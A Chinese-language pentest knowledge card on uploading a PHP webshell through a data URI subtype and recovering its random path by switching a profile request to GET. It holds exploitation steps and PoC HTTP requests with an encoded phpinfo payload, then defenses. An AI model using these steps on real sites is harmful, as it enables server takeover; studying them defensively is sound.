---
id: web-generic-file-upload-get-endpoint-returns-upload-path
title: 上传路径二次回显：数据 URI 上传成功后改 GET 请求同一资料接口，从 headpic 字段拿回随机落盘路径
type: scenario
domain: web
path: web/generic/file-upload
technique: upload-path-disclosure-via-get-profile-field
aliases:
- GET 回显 headpic 路径
- do_my_info 路径泄露
- user_recharge upload_base64
- Change Request Method 拿路径
- 上传文件名随机 7 位数字
- 用户资料字段回显上传路径
tags:
- php
- file-upload
- base64
- data-uri
- path-disclosure
- webshell
- get-method
- thinkphp
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V594
  verified_at: '2026-11-12T15:38:43+08:00'
  notes: 已对照原文及截图核对：upload_base64 用 preg_match 取 data:image/(\w+);base64 的 MIME 子类型作后缀、落盘 upload/<type>/<年>/<YmdHis>-<rand(0,9999999)>.<子类型>（图 31、33）；user_recharge POST pic=data:image/php response 提交成功（图 32），do_my_info POST headpic 提交后 Change Request Method 改 GET 返回 data.headpic=\/upload\/xy\/2023\/08-29\/20230829101313-5983289.php（图 36-37），访问该路径 phpinfo 执行（图 38），均与原文一致。已修正卡内 POST 响应示例为“提交成功/操作成功”（原写“请求成功”实为 GET 响应文本）。与 data-uri 子类型上传卡互链但不同点（本卡为路径回显），dedup 成立。未复跑。
---

## 一句话结论

当上传接口把文件交给 `upload_base64` 落盘、文件名由「日期时间 + 7 位随机数」生成且 POST 只返回“提交成功”时，若同一控制器存在 GET 分支返回用户资料（`headpic` 字段），用 Burp 的 Change Request Method 把同一请求改成 GET，就能从资料字段读回完整的落盘路径（如 `/upload/xy/2023/08-29/20230829101313-5983289.php`），进而访问刚上传的 PHP WebShell。

## 原理

- **随机文件名造成盲区**：`upload_base64($type, $img)` 的落盘规则是 `upload/<type>/<年>/<YmdHis>-<rand(0,9999999)>.<MIME 子类型>`，并递归检查文件是否已存在；日期时间可预测，但 7 位随机数不可预测，且上传接口的 POST 响应只有 `{"code":0,"info":"提交成功"}`（do_my_info 返回“操作成功”），不返回路径。
- **路径被存入业务字段**：调用方（案例 `user_recharge`/`do_my_info`）拿到 `upload_base64` 的返回值后，把它写进数据库用户资料（如 `headpic` 头像字段），否则前端无法展示头像。
- **GET 分支回显资料**：同一控制器方法的 GET 分支用 `db('xy_users')->field('username,headpic,nickname,...')->find(session('user_id'))` 查询当前用户资料并原样返回 `data`，因此把 POST 请求改成 GET（参数不变或省略）就能拿到刚写入的 `headpic` 完整路径。
- **为什么成立**：上传的“返回值”在业务上必须对用户可见（头像展示），只要找到任何一个读取该字段的接口（资料页、订单详情、列表 API），路径就会随业务数据回显；本例恰好是同一路由的 GET 分支，改方法即可。
- **与上传本身的配合**：上传接口信任 data URI 的 MIME 子类型作为扩展名（`data:image/php;base64,...` → `.php`），因此路径回显后访问即可执行 PHP；路径回显是“盲上传”变成“可访问 WebShell”的关键一步。

## 触发条件

- 已注册/登录前台普通用户（上传与资料接口通常要求用户会话）。
- 存在复用 `upload_base64`（或同类随机命名上传函数）的接口，且 POST 响应不返回路径。
- 有接口把上传结果写入用户资料/业务对象，并能被当前用户读取（同路由 GET、资料接口、列表接口等）。
- 上传目录位于 Web 根且按后缀解析；扩展名由 MIME 子类型决定时可直接落 PHP（见关联卡）。
- 上传文件名随机位数不可预测（本例 7 位），但路径可通过业务字段回显，无需爆破。

## 利用步骤

1. 用普通用户登录，找到一个会把图片/文件上传结果存入资料字段的接口（案例 `POST /index/my/user_recharge` 或 `/index/my/do_my_info`，参数 `headpic`/`pic`）。
2. 构造 `pic=data:image/php;base64,<base64(PHP代码)>`（或 `headpic=...`）POST 上传，响应只提示“提交成功/操作成功”，没有路径。
3. 对同一 URL 使用 Burp「Change Request Method」改成 GET（或直接 GET 资料接口），响应 JSON 中的 `data.headpic` 即刚上传文件的完整相对路径。
4. 拼接站点根访问该路径（如 `http://target/upload/xy/2023/08-29/20230829101313-5983289.php`），用 `phpinfo()`/一句话木马验证执行。
5. 若在 POST 与 GET 之间数据库有缓存/异步写入，稍等或重复查询；若 GET 分支不返回该字段，再找资料页/订单列表等其它读取点。

## PoC

```http
### 1) POST 上传（响应不含路径）
POST /index/my/user_recharge HTTP/1.1
Host: target
Cookie: PHPSESSID=<user session>
Content-Type: application/x-www-form-urlencoded

pic=data%3aimage/php%3bbase64,PD9waHAgcGhwaW5mbygpOz8%2b&tel=13800000000&num=1

HTTP/1.1 200 OK

{"code":0,"info":"提交成功"}
```

```http
### 2) 同一接口改 GET（Change Request Method），回显落盘路径
GET /index/my/do_my_info HTTP/1.1
Host: target
Cookie: PHPSESSID=<user session>

HTTP/1.1 200 OK

{"code":0,"info":"请求成功","data":{
  "username":"zzmaku.com",
  "headpic":"\/upload\/xy\/2023\/08-29\/20230829101313-5983289.php",
  "nickname":"","sign":"",
  "wx_ewm":"\/upload\/xy\/2023\/08-29\/20230829093718-9622868.png"
}}
```

```text
### 3) 访问回显路径
http://target/upload/xy/2023/08-29/20230829101313-5983289.php
→ phpinfo / 一句话木马执行
```

案例通过该方法拿到上传路径并成功访问 PHP 文件（phpinfo 页面），未在本机复跑；随机数位数、日期目录与字段名随应用实现变化。

## 变体与关联

- 关联：[[web-generic-file-upload-base64-data-uri-subtype-php-webshell]]（本卡的上传原语：data URI MIME 子类型被拼成 `.php` 后缀）。
- 关联：[[web-generic-file-upload-signed-visit-302-path-disclosure]]（另一种路径泄露：签名访问接口 302 Location 暴露真实存储路径）。
- 关联：[[web-generic-file-upload-thinkphp-debug-error-path-leak]]（ThinkPHP 调试异常页变量泄露落盘路径）。
- 关联：[[web-generic-file-inclusion-admin-api-update-read-base36-encode-path]]（案例中先通过任意文件读取日志发现本上传接口）。
- 变体：路径回显点可以是资料接口、订单详情、评论列表、消息通知、后台审核列表；任何“业务上需要展示上传结果”的读取接口都可尝试。
- 变体：若文件名完全不可预测且无回显，可尝试上传覆盖已知文件名（用户可控文件名）、目录列表、日志读取或 7 位随机数爆破。
- 边界：上传结果未入库/只存临时目录、GET 分支不返回该字段、上传目录禁止执行脚本时，路径回显也无法直接 getshell。

## 检测与防御

- **上传安全**：按真实文件内容（`finfo`/`getimagesize`）判定类型并映射安全后缀；上传目录禁止执行脚本（Nginx 不转 PHP-FPM、Apache `php_admin_flag engine off`）。
- **路径管理**：不把带随机名的可执行文件暴露为可访问路径；返回给用户的应是受控的下载接口（鉴权+签名），而不是真实存储路径。
- **接口设计**：POST 上传只返回无敏感信息的 ID；GET 资料接口对文件 URL 做脱敏或使用 CDN 域名，避免泄露内部目录结构与随机文件名。
- **检测**：监控上传接口后紧跟同路由 GET/资料查询的请求；`data:image/php`、`data:image/phtml` 等非图片子类型；upload 目录新增 `.php` 文件及其访问；用户资料字段出现异常路径。
- **响应**：发现此类 WebShell 时隔离主机、审计上传与访问日志、清理恶意文件并修复上传校验。
